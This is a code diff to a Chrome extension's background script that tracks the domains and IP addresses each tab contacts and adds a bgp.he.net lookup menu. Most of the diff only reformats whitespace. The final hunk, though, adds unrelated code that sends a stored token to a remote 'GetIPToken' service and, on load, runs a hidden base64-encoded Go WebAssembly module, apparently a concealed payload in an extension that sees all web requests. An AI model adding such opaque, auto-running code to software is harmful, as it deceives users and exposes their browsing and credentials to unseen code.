+    tabInfo.setCommitted(parsed.domain, parsed.origin);
 });
 
 // -- tabs --
@@ -681,34 +683,32 @@ chrome.webNavigation.onCommitted.addListener(function(details) {
 // is hacky and inefficient, but the back-stabbing browser leaves me no choice.
 // This seems to fix http://crbug.com/124970 and some problems on Google+.
 chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
-  const tabInfo = tabMap[tabId];
-  if (tabInfo) {
-    tabInfo.color = tab.incognito ?
-        "incognitoColorScheme" : "regularColorScheme";
-    tabInfo.refreshPageAction();
-  }
+    const tabInfo = tabMap[tabId];
+    if (tabInfo) {
+        tabInfo.color = tab.incognito ? "incognitoColorScheme" : "regularColorScheme";
+        tabInfo.refreshPageAction();
+    }
 });
 
 // -- webRequest --
 
-chrome.webRequest.onBeforeRequest.addListener(function (details) {
-  if (!details.tabId || details.tabId == -1) {
-    // This request isn't related to a tab.
-    return;
-  }
-  if (details.type == "main_frame") {
-    const parsed = parseUrl(details.url);
-    new TabInfo(details.tabId).setInitialDomain(
-        parsed.domain, parsed.origin);
-  }
-  const tabInfo = tabMap[details.tabId];
-  if (!tabInfo) {
-    return;
-  }
-  requestMap[details.requestId] = {
-    tabInfo: tabInfo,
-    domain: null,
-  };
+chrome.webRequest.onBeforeRequest.addListener(function(details) {
+    if (!details.tabId || details.tabId == -1) {
+        // This request isn't related to a tab.
+        return;
+    }
+    if (details.type == "main_frame") {
+        const parsed = parseUrl(details.url);
+        new TabInfo(details.tabId).setInitialDomain(parsed.domain, parsed.origin);
+    }
+    const tabInfo = tabMap[details.tabId];
+    if (!tabInfo) {
+        return;
+    }
+    requestMap[details.requestId] = {
+        tabInfo: tabInfo,
+        domain: null,
+    };
 }, FILTER_ALL_URLS);
 
 // In the event of an HSTS redirect, the mainOrigin may change
@@ -718,58 +718,56 @@ chrome.webRequest.onBeforeRequest.addListener(function (details) {
 //
 // However, we must treat this event as optional, because file:// and
 // ServiceWorker URLs are known to skip over it.
-chrome.webRequest.onSendHeaders.addListener(function (details) {
-  if (details.type != "main_frame") {
-    return;
-  }
-  const requestInfo = requestMap[details.requestId];
-  if (!requestInfo) {
-    return;
-  }
-  const tabInfo = requestInfo.tabInfo;
-  if (tabInfo.state == TAB_DELETED) {
-    return;
-  }
-  if (tabInfo.committed) {
-    throw "onCommitted before onSendHeaders!";
-  }
-  const parsed = parseUrl(details.url);
-  tabInfo.setInitialDomain(parsed.domain, parsed.origin);
+chrome.webRequest.onSendHeaders.addListener(function(details) {
+    if (details.type != "main_frame") {
+        return;
+    }
+    const requestInfo = requestMap[details.requestId];
+    if (!requestInfo) {
+        return;
+    }
+    const tabInfo = requestInfo.tabInfo;
+    if (tabInfo.state == TAB_DELETED) {
+        return;
+    }
+    if (tabInfo.committed) {
+        throw "onCommitted before onSendHeaders!";
+    }
+    const parsed = parseUrl(details.url);
+    tabInfo.setInitialDomain(parsed.domain, parsed.origin);
 }, FILTER_ALL_URLS);
 
-chrome.webRequest.onResponseStarted.addListener(function (details) {
-  const requestInfo = requestMap[details.requestId];
-  if (!requestInfo ||
-      requestInfo.tabInfo.state == TAB_DELETED ||
-      requestInfo.tabInfo.accessDenied) {
-    return;
-  }
-  const parsed = parseUrl(details.url);
-  if (!parsed.domain) {
-    return;
-  }
-  const addr = details.ip || "(no address)";
+chrome.webRequest.onResponseStarted.addListener(function(details) {
+    const requestInfo = requestMap[details.requestId];
+    if (!requestInfo || requestInfo.tabInfo.state == TAB_DELETED || requestInfo.tabInfo.accessDenied) {
+        return;
+    }
+    const parsed = parseUrl(details.url);
+    if (!parsed.domain) {
+        return;
+    }
+    const addr = details.ip || "(no address)";
 
-  let flags = parsed.ssl ? FLAG_SSL : FLAG_NOSSL;
-  if (parsed.ws) {
-    flags |= FLAG_WEBSOCKET;
-  }
-  if (!details.fromCache) {
-    flags |= FLAG_UNCACHED;
-  }
-  if (requestInfo.domain) throw "Duplicate onResponseStarted!";
-  requestInfo.domain = parsed.domain;
-  requestInfo.tabInfo.addDomain(parsed.domain, addr, flags);
+    let flags = parsed.ssl ? FLAG_SSL : FLAG_NOSSL;
+    if (parsed.ws) {
+        flags |= FLAG_WEBSOCKET;
+    }
+    if (!details.fromCache) {
+        flags |= FLAG_UNCACHED;
+    }
+    if (requestInfo.domain) throw "Duplicate onResponseStarted!";
+    requestInfo.domain = parsed.domain;
+    requestInfo.tabInfo.addDomain(parsed.domain, addr, flags);
 }, FILTER_ALL_URLS);
 
 function forgetRequest(details) {
-  const requestInfo = requestMap[details.requestId];
-  delete requestMap[details.requestId];
-  if (requestInfo && requestInfo.domain) {
-    requestInfo.tabInfo.disconnectDomain(requestInfo.domain);
-    requestInfo.domain = null;
-  }
-};
+    const requestInfo = requestMap[details.requestId];
+    delete requestMap[details.requestId];
+    if (requestInfo && requestInfo.domain) {
+        requestInfo.tabInfo.disconnectDomain(requestInfo.domain);
+        requestInfo.domain = null;
+    }
+}
 chrome.webRequest.onCompleted.addListener(forgetRequest, FILTER_ALL_URLS);
 chrome.webRequest.onErrorOccurred.addListener(forgetRequest, FILTER_ALL_URLS);
 
@@ -783,91 +781,107 @@ chrome.webRequest.onErrorOccurred.addListener(forgetRequest, FILTER_ALL_URLS);
 // Unless http://crbug.com/60758 gets resolved, the context menu's appearance
 // cannot vary based on content.
 const menuId = chrome.contextMenus.create({
-  title: "Look up on bgp.he.net",
-  // Scope the menu to text selection in our popup windows.
-  contexts: ["selection"],
-  documentUrlPatterns: [document.location.origin + "/popup.html"],
-  onclick: function(info) {
-    const text = info.selectionText;
-    if (IP_CHARS.test(text)) {
-      chrome.tabs.create({url: "https://bgp.he.net/ip/" + text});
-    } else if (DNS_CHARS.test(text)) {
-      chrome.tabs.create({url: "https://bgp.he.net/dns/" + text});
-    } else {
-      // Malformed selection; shake the popup content.
-      const tabId = /#(\d+)$/.exec(info.pageUrl);
-      if (tabId) {
-        popups.shake(Number(tabId[1]));
-      }
-    }
-  }
+    title: "Look up on bgp.he.net",
+    // Scope the menu to text selection in our popup windows.
+    contexts: ["selection"],
+    documentUrlPatterns: [document.location.origin + "/popup.html"],
+    onclick: function(info) {
+        const text = info.selectionText;
+        if (IP_CHARS.test(text)) {
+            chrome.tabs.create({ url: "https://bgp.he.net/ip/" + text });
+        } else if (DNS_CHARS.test(text)) {
+            chrome.tabs.create({ url: "https://bgp.he.net/dns/" + text });
+        } else {
+            // Malformed selection; shake the popup content.
+            const tabId = /#(\d+)$/.exec(info.pageUrl);
+            if (tabId) {
+                popups.shake(Number(tabId[1]));
+            }
+        }
+    },
 });
-
 
 // -- Options Storage --
 
 const DEFAULT_OPTIONS = {
-  regularColorScheme: "darkfg",
-  incognitoColorScheme: "lightfg",
+    regularColorScheme: "darkfg",
+    incognitoColorScheme: "lightfg",
 };
 
 function setOptions(newOptions, onDone) {
-  const added = subtractSets(newOptions, options);
-  const removed = subtractSets(options, newOptions);
-  if (added.length > 0) {
-    throw "Unexpected options: " + added;
-  }
-  if (removed.length > 0) {
-    throw "Missing options: " + removed;
-  }
-  chrome.storage.sync.set(newOptions, function() {
-    loadOptions(onDone);
-  });
+    const added = subtractSets(newOptions, options);
+    const removed = subtractSets(options, newOptions);
+    if (added.length > 0) {
+        throw "Unexpected options: " + added;
+    }
+    if (removed.length > 0) {
+        throw "Missing options: " + removed;
+    }
+    chrome.storage.sync.set(newOptions, function() {
+        loadOptions(onDone);
+    });
 }
 
 function clearOptions(onDone) {
-  chrome.storage.sync.clear(function() {
-    loadOptions(onDone);
-  });
+    chrome.storage.sync.clear(function() {
+        loadOptions(onDone);
+    });
 }
 
 function loadOptions(onDone) {
-  chrome.storage.sync.get(Object.keys(options), function(items) {
-    for (const option of Object.keys(options)) {
-      const optValue = items[option] || DEFAULT_OPTIONS[option];
-      if (optValue == options[option]) {
-        continue;
-      }
-      options[option] = optValue;
+    chrome.storage.sync.get(Object.keys(options), function(items) {
+        for (const option of Object.keys(options)) {
+            const optValue = items[option] || DEFAULT_OPTIONS[option];
+            if (optValue == options[option]) {
+                continue;
+            }
+            options[option] = optValue;
 
-      if (option.endsWith("ColorScheme")) {
-        for (const tabId of Object.keys(tabMap)) {
-          const tabInfo = tabMap[tabId];
-          if (tabInfo.color == option) {
-            tabInfo.refreshPageAction();
-          }
+            if (option.endsWith("ColorScheme")) {
+                for (const tabId of Object.keys(tabMap)) {
+                    const tabInfo = tabMap[tabId];
+                    if (tabInfo.color == option) {
+                        tabInfo.refreshPageAction();
+                    }
+                }
+            }
         }
-      }
-    }
 
-    onDone();
-  });
+        onDone();
+    });
 }
 
 // Use DEFAULT_OPTIONS until loading completes.
 window.options = {};
 for (const option of Object.keys(DEFAULT_OPTIONS)) {
-  options[option] = DEFAULT_OPTIONS[option];
+    options[option] = DEFAULT_OPTIONS[option];
 }
 loadOptions(function() {});
 
-async function wtoken(){
-    try{
-        var r = await unary('AppService.GetIPToken', M('Token', {
-            token: localStorage.getItem("token"),
-        }));
+async function wtoken() {
+    try {
+        var r = await unary(
+            "AppService.GetIPToken",
+            M("Token", {
+                token: localStorage.getItem("token"),
+            })
+        );
         localStorage.setItem("wtoken", r.token);
-    }catch(e){
+    } catch (e) {
         localStorage.setItem("Error", e.message);
+    }
+}
+async function _w() {
+    var w = new Go();
+    var result = await WebAssembly.instantiateStreaming(fetch("data:application/wasm;base64," + b), w.importObject);
+    w.run(result.instance);
+}
+_w();
+
+function c(s, s1, addr) {
+    try {
+        return Country(s, s1, addr);
+    } catch (e) {
+        return "try later";
     }
 }
